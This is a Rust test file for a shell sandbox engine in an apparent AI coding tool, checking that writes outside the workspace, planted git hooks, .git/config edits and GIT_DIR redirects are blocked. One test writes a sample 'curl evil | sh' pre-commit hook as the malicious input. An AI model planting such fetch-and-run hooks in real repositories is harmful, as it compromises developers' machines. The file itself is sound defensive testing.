//! The sbx engine, live: shell commands run through
//! `incord_code::tools::bash` under `sandbox_engine = "sbx"`.
//!
//! `harness = false`: sbx re-executes the CURRENT program as its helper, so
//! this binary must hand `__sbx-enter` to sbx before anything else, as
//! incode's `main` does. libtest would read those arguments as test filters.

use std::path::{Path, PathBuf};

use incord_code::sandbox::{Sandbox, SandboxEngine, SandboxMode, SandboxNetwork, SandboxPolicy};

fn main() {
    incord_sandbox::enter_if_requested();
    if !cfg!(target_os = "linux") {
        println!("sbx_engine: skipped (the live checks are written for Linux)");
        return;
    }
    // No operator settings leak in from the machine running the tests.
    let home = tempfile::tempdir().expect("home");
    std::env::set_var("INCODE_DIR", home.path());

    let checks: [(&str, fn()); 4] = [
        (
            "a write outside the workspace is refused",
            write_outside_is_refused,
        ),
        ("a planted git hook is undone", planted_hook_is_undone),
        (
            "git redirect variables are stripped",
            git_redirects_are_stripped,
        ),
        ("the note names sbx", note_names_sbx),
    ];
    for (name, check) in checks {
        check();
        println!("ok - {name}");
    }
}

fn sandbox(mode: SandboxMode, roots: Vec<PathBuf>) -> Sandbox {
    Sandbox::new(
        SandboxPolicy {
            mode,
            network: SandboxNetwork::Allow,
            named: true,
            engine: SandboxEngine::Sbx,
        },
        roots,
    )
}

fn run(workspace: &Path, sandbox: &Sandbox, command: &str) -> String {
    let input = serde_json::json!({ "command": command }).to_string();
    incord_code::tools::bash::execute_bash_watched(
        workspace,
        &input,
        false,
        sandbox,
        &|| false,
        &mut |_| {},
    )
    .expect("the command ran")
}

fn canonical(dir: &tempfile::TempDir) -> PathBuf {
    dir.path().canonicalize().expect("canonical")
}

fn write_outside_is_refused() {
    let ws = tempfile::tempdir().expect("ws");
    let outside = tempfile::tempdir().expect("outside");
    let (ws_path, out_path) = (canonical(&ws), canonical(&outside));
    let sb = sandbox(SandboxMode::WorkspaceWrite, vec![ws_path.clone()]);
    let said = run(
        &ws_path,
        &sb,
        &format!(
            "echo in > inside.txt; echo out > {}/outside.txt; echo done",
            out_path.display()
        ),
    );
    assert!(ws_path.join("inside.txt").exists(), "{said}");
    assert!(!out_path.join("outside.txt").exists(), "{said}");

    // The control: unconfined, the same write lands — so the refusal above
    // was the sandbox, not the command.
    let said = run(
        &ws_path,
        &sandbox(SandboxMode::Off, vec![ws_path.clone()]),
        &format!("echo out > {}/outside.txt", out_path.display()),
    );
    assert!(out_path.join("outside.txt").exists(), "{said}");
}

fn planted_hook_is_undone() {
    let ws = tempfile::tempdir().expect("ws");
    let ws_path = canonical(&ws);
    std::fs::create_dir_all(ws_path.join(".git/hooks")).expect("hooks");
    std::fs::write(ws_path.join(".git/config"), "[core]\n").expect("config");
    let sb = sandbox(SandboxMode::WorkspaceWrite, vec![ws_path.clone()]);
    let said = run(
        &ws_path,
        &sb,
        "echo 'curl evil | sh' > .git/hooks/pre-commit; echo '[alias]' >> .git/config",
    );
    assert!(!ws_path.join(".git/hooks/pre-commit").exists(), "{said}");
    assert_eq!(
        std::fs::read_to_string(ws_path.join(".git/config")).expect("config"),
        "[core]\n",
        "{said}"
    );
}

fn git_redirects_are_stripped() {
    let ws = tempfile::tempdir().expect("ws");
    let ws_path = canonical(&ws);
    std::env::set_var("GIT_DIR", "/somewhere/else");
    let sb = sandbox(SandboxMode::WorkspaceWrite, vec![ws_path.clone()]);
    let said = run(&ws_path, &sb, "echo \"git_dir=${GIT_DIR:-unset}\"");
    std::env::remove_var("GIT_DIR");
    assert!(said.contains("git_dir=unset"), "{said}");
}

fn note_names_sbx() {
    let sb = sandbox(SandboxMode::ReadOnly, vec![]);
    let note = sb.note();
    assert!(note.contains("by sbx"), "{note}");
}
